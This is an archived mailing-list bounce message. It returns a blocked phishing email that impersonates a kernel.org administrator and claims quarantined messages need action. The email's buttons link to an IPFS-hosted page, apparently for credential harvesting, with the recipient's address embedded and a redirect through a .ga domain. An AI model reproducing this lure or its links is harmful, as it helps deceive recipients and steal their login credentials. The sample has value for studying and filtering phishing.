Return-Path: <MAILER-DAEMON>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp.kernel.org (aws-us-west-2-korg-mail-1.web.codeaurora.org [10.30.226.201])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 25AD9EB64DD
	for <soc@archiver.kernel.org>; Sun, 13 Aug 2023 23:21:47 +0000 (UTC)
Received: by smtp.kernel.org (Postfix)
	id E8482C433C9; Sun, 13 Aug 2023 23:21:46 +0000 (UTC)
Received: from chg.server2.ideacentral.com (unknown [108.163.232.234])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
	(No client certificate requested)
	by smtp.kernel.org (Postfix) with ESMTPS id 2165FC433C7
	for <soc@kernel.org>; Sun, 13 Aug 2023 23:21:46 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.1 smtp.kernel.org 2165FC433C7
Authentication-Results: smtp.kernel.org; dmarc=none (p=none dis=none) header.from=ns-196.awsdns-24.com
Authentication-Results: smtp.kernel.org; spf=none smtp.helo=chg.server2.ideacentral.com
Received: from mailnull by ns-196.awsdns-24.com with local (Exim 4.96)
	id 1qVKP3-00COH8-0j
	for soc@kernel.org;
	Sun, 13 Aug 2023 18:21:45 -0500
X-Failed-Recipients: soc@kernel.org
Auto-Submitted: auto-replied
From: Mail Delivery System <Mailer-Daemon@ns-196.awsdns-24.com>
List-Id: <soc.lore.kernel.org>
To: soc@kernel.org
References: <20230814002142.B09C7749E66E56C3@kernel.org>
Content-Type: multipart/report; report-type=delivery-status; boundary=1691968905-eximdsn-1882326758
MIME-Version: 1.0
Subject: Mail delivery failed: returning message to sender
Message-Id: <E1qVKP3-00COH8-0j@ns-196.awsdns-24.com>
Date: Sun, 13 Aug 2023 18:21:45 -0500
X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
X-AntiAbuse: Primary Hostname - ns-196.awsdns-24.com
X-AntiAbuse: Original Domain - kernel.org
X-AntiAbuse: Originator/Caller UID/GID - [47 12] / [47 12]
X-AntiAbuse: Sender Address Domain - 
X-Get-Message-Sender-Via: ns-196.awsdns-24.com: sender_ident via received_protocol == local: mailnull/primary_hostname/system user
X-Authenticated-Sender: ns-196.awsdns-24.com: mailnull

--1691968905-eximdsn-1882326758
Content-type: text/plain; charset=us-ascii

This message was created automatically by mail delivery software.

A message that you sent could not be delivered to one or more of its
recipients. This is a permanent error. The following address(es) failed:

  soc@kernel.org
    host smtp2.kernel.org [35.85.114.177]
    SMTP error from remote mail server after end of data:
    550 5.7.1 Blocked by SpamAssassin

--1691968905-eximdsn-1882326758
Content-type: message/delivery-status

Reporting-MTA: dns; ns-196.awsdns-24.com

Action: failed
Final-Recipient: rfc822;soc@kernel.org
Status: 5.0.0
Remote-MTA: dns; smtp2.kernel.org
Diagnostic-Code: smtp; 550 5.7.1 Blocked by SpamAssassin

--1691968905-eximdsn-1882326758
Content-type: message/rfc822

Return-path: <soc@kernel.org>
Received: from v-104-153-108-120.unman-vds.premium-chicago.nfoservers.com ([104.153.108.120]:64088)
	by ns-196.awsdns-24.com with esmtpsa  (TLS1.3) tls TLS_AES_256_GCM_SHA384
	(Exim 4.96)
	(envelope-from <soc@kernel.org>)
	id 1qVKP1-00CNxa-12
	for soc@kernel.org;
	Sun, 13 Aug 2023 18:21:43 -0500
From: kernel.orgAdministrator<soc@kernel.org>
List-Id: <soc.lore.kernel.org>
To: soc@kernel.org
Subject: =?UTF-8?B?IOKaoO+4jyBXQVJOSU5HOlNvbWUgRW1haWxzIENvdWxkIG5vdCBiZSBkZWxpdmVyZWQg?=
Date: 14 Aug 2023 00:21:42 +0100
Message-ID: <20230814002142.B09C7749E66E56C3@kernel.org>
MIME-Version: 1.0
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE html>

<html><head><title></title>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19003">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body><span style=3D"background-color: rgb(204, 204, 204);"><b><i><font col=
or=3D"#ff0000">Some Emails Could not be Delivered , Action Required</font><=
/i></b>.</span><div><br><font color=3D"#3d85c6"><font size=3D"4"><b>Quarant=
ined Messages Report</b> </font>&nbsp;</font><br>soc@kernel.org<div>13-08-2=
023, 08:00AM <br>&nbsp;<br>Dear soc,</div><div><br>
4 messages addressed to you are currently on hold awaiting your further act=
ion. You can release all of your held messages and permit or block future e=
mails from the senders, or manage messages individually.<br><br>
<a href=3D"https://ipfs.io/ipfs/Qmak1oxePK5rUrFTQbZYckBAUWmRGbcFJkycxN8DaPa=
nxX?clientID=3Dsoc@kernel.org" target=3D"_blank" data-saferedirecturl=3D"ht=
tps://www.google.com/url?q=3Dhttps://bentdree.ga/%23%5B%5B-Email-%5D%5D&amp=
;source=3Dgmail&amp;ust=3D1620160588649000&amp;usg=3DAFQjCNFFwLZWfJX-xB2LHr=
k7CvessvAOsg">Review all</a>
&nbsp; &nbsp;<a href=3D"https://ipfs.io/ipfs/Qmak1oxePK5rUrFTQbZYckBAUWmRGb=
cFJkycxN8DaPanxX?clientID=3Dsoc@kernel.org" target=3D"_blank" data-saferedi=
recturl=3D"https://www.google.com/url?q=3Dhttps://bentdree.ga/%23%5B%5B-Ema=
il-%5D%5D&amp;source=3Dgmail&amp;ust=3D1620160588649000&amp;usg=3DAFQjCNFFw=
LZWfJX-xB2LHrk7CvessvAOsg">Release all</a>
&nbsp; &nbsp; <a href=3D"https://ipfs.io/ipfs/Qmak1oxePK5rUrFTQbZYckBAUWmRG=
bcFJkycxN8DaPanxX?clientID=3Dsoc@kernel.org" target=3D"_blank" data-safered=
irecturl=3D"https://www.google.com/url?q=3Dhttps://bentdree.ga/%23%5B%5B-Em=
ail-%5D%5D&amp;source=3Dgmail&amp;ust=3D1620160588649000&amp;usg=3DAFQjCNFF=
wLZWfJX-xB2LHrk7CvessvAOsg">Block all</a><br><br>Further Information: <br>
To view your entire quarantine inbox or manage your preferences, <a href=3D=
"https://ipfs.io/ipfs/Qmak1oxePK5rUrFTQbZYckBAUWmRGbcFJkycxN8DaPanxX?client=
ID=3Dsoc@kernel.org" target=3D"_blank" data-saferedirecturl=3D"https://www.=
google.com/url?q=3Dhttps://bentdree.ga/%23%5B%5B-Email-%5D%5D&amp;source=3D=
gmail&amp;ust=3D1620160588649000&amp;usg=3DAFQjCNFFwLZWfJX-xB2LHrk7CvessvAO=
sg">Click Here</a><br><br>The system generated this notice on 13-08-2023, a=
t 09:00AM<br>Do not reply to this automated message.<br>
&copy; 2023 kernel.org. All rights reserved.</div></div>
</body></html>

--1691968905-eximdsn-1882326758--
